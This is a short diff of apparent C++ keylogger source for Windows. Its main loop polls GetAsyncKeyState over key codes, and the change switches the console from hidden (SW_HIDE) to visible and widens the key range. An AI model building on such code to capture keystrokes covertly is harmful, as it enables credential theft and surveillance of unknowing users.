@@ -14,13 +14,13 @@ bool specialKeys(int S_Key);
 
 int main()
 {
-	//ShowWindow(GetConsoleWindow(), SW_NORMAL);
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	ShowWindow(GetConsoleWindow(), SW_NORMAL);
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	while (true)
 	{
 		Sleep(10);
-		for (int KEY = 1; KEY <= 190; KEY++)
+		for (int KEY = 1; KEY <= 222; KEY++)
 		{
 			if (GetAsyncKeyState(KEY) == -32767)
 			{
